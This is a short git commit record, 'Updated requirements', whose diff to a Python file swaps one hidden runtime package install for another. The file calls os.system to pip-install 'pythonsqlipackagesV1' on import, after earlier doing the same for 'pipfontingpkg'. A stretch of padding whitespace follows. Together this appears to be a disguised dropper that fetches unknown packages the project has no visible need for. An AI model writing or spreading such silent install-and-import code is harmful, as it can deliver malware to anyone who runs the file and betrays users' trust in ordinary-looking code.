fa1a7dbfe6a1baffe0b13114a3a499f09657a8c3
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-08-06 22:26:43 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingpkg")
-import pipfontingpkg
+os.system("pip install pythonsqlipackagesV1")
+import pythonsqlipackagesV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
